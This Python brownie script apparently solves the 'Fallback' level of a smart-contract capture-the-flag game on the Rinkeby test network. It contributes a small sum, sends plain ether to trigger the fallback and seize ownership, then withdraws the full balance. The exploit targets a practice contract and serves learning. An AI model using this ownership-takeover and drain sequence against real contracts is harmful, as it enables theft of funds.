from brownie import accounts, Fallback
from web3 import Web3

eth_amount = Web3.toWei("0.00001", "ether")

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x514631fa457FeA40eFFaE917fC86C64FB2c64C3C"
fallback = Fallback.at(instance_address)

# -----------------------------------------------------
# to beat this level you need to:
# 1. claim ownership of the contract
# 2. reduce its balance to 0
# -----------------------------------------------------


def level_completed():
    return fallback.owner() == account.address and fallback.balance() == 0


def exploit():
    # check owner and balance of contract
    print(
        f"The owner of the contract is: {fallback.owner()} and the balance of the contract is: {fallback.balance()}"
    )

    # call contribute
    tx = fallback.contribute({"from": account, "value": eth_amount})
    tx.wait(1)

    # plain eth transfer to trigger fallback function
    tx = account.transfer(fallback, "0.00001 ether")
    tx.wait(1)

    # drain the contract
    tx = fallback.withdraw({"from": account})
    tx.wait(1)

    # confirm that we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
